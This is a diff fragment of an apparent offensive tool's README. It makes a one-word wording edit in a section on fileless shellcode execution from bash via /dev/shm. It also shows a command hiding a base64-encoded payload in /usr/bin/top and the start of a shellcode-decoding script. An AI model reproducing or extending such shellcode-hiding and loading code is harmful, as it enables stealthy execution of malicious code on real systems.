@@ -39,7 +39,7 @@ python3 hide_in_image.py /usr/bin/top ailYmWoCX2oBXg8FSJdIuQIAAbt/AAABUUiJ5moQWm
 ```
 
 ### executing schellcode from `bash`
-Quasi-fileless (assuming writing to `/dev/shm` is considered fileless) execution of shellcode can also be achieved by using `bash` scripting only.
+Quasi-fileless (assuming writing to `/dev/shm` is considered fileless) execution of shellcode can also be achieved using `bash` scripting only.
 ```bash
 # read first function argument
 shellcode=$(base64 -d <<<$1)
